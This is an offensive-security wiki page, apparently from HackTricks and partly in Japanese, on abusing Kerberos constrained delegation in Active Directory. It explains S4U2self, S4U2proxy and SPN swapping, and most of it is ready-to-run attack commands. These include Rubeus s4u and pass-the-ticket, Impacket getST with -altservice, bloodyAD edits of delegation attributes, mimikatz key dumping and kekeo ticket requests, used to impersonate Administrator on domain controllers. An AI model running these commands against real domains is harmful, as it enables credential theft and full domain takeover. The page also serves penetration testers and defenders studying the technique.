# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

これにより Domain admin は、あるコンピュータが任意のマシンの任意の **service** に対してユーザまたはコンピュータを **impersonate** することを **allow** できる。

- **Service for User to self (_S4U2self_):** If a **service account** has a _userAccountControl_ value containing [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), then it can obtain a TGS for itself (the service) on behalf of any other user.
- **Service for User to Proxy(_S4U2proxy_):** **service account** は **msDS-AllowedToDelegateTo** に設定されたサービスに対して、任意のユーザに代わって TGS を取得できる。これを行うにはまずそのユーザから自分自身への TGS が必要だが、他の TGS を要求する前に S4U2self を使ってその TGS を取得できる。

**Note**: AD 上でユーザが ‘_Account is sensitive and cannot be delegated_ ’ とマークされている場合、そのユーザを **impersonate** することはできない。

これは、もし**compromise the hash of the service**した場合、ユーザを**impersonate users**し、対象マシン上の任意の**service**に代わって**access**を取得できる（結果として**privesc**の可能性）。

さらに、ユーザが偽装できるサービスだけでなく任意のサービスにもアクセスできる。これは SPN（要求されるサービス名）がチェックされないためで、チケット内のこの部分は暗号化/署名されていないためである。したがって、例えば **CIFS service** へアクセスできれば、Rubeus の `/altservice` フラグを使って **HOST service** にもアクセスできる。同じ SPN スワップの脆弱性は **Impacket getST -altservice** や他のツールでも悪用されている。

また、**LDAP service access on DC** は **DCSync** を悪用するために必要となる。
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Cross-domain constrained delegation notes (2025+)

**Windows Server 2012/2012 R2** 以降、KDC は S4U2Proxy 拡張を通じて **constrained delegation across domains/forests** をサポートします。Modern builds (Windows Server 2016–2025) はこの動作を維持し、プロトコル遷移を示す 2 つの PAC SID を追加します:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) ユーザーが通常の方法で認証した場合に付与されます。
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) サービスがプロトコル遷移を通じてアイデンティティを主張した場合に付与されます。

ドメイン間でプロトコル遷移が使用された場合、PAC 内に `SERVICE_ASSERTED_IDENTITY` が含まれていることが期待され、S4U2Proxy ステップが成功したことを確認できます。

### Impacket / Linux tooling (altservice & full S4U)

Recent Impacket (0.11.x+) exposes the same S4U chain and SPN swapping as Rubeus:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
先にユーザーのSTを偽造する方が好みの場合（例：オフラインハッシュのみ）、S4U2Proxyには**ticketer.py**と**getST.py**を組み合わせて使用してください。現在の挙動については、オープンなImpacket issue #1713を参照してください（偽造したSTがSPNキーと一致しないとKRB_AP_ERR_MODIFIEDが発生します）。

### 低権限クレデンシャルからの委任設定の自動化

すでにコンピュータまたはサービスアカウントに対して**GenericAll/WriteDACL**を持っている場合、**bloodyAD**（2024+）を使ってRSAT不要で必要な属性をリモートに適用できます：
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
これにより、これらの属性に書き込み可能になった時点で、DA権限なしにprivescのためのconstrained delegationパスを構築できます。

- ステップ1: **許可されたサービスのTGTを取得する**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Printer Bug や unconstrain delegation、NTLM relaying、Active Directory Certificate Service abuse のように、コンピュータ上で SYSTEM にならなくても、**TGT ticket** や **RC4**、**AES256** を取得する他の方法がある。
>
> **その TGT ticket (or hashed) を持っているだけで、この攻撃をコンピュータ全体を侵害せずに実行できる。**

- Step2: **ユーザーをなりすましてサービスのTGSを取得する**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**詳細は ired.team を参照してください。**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) および [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## 参考資料
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
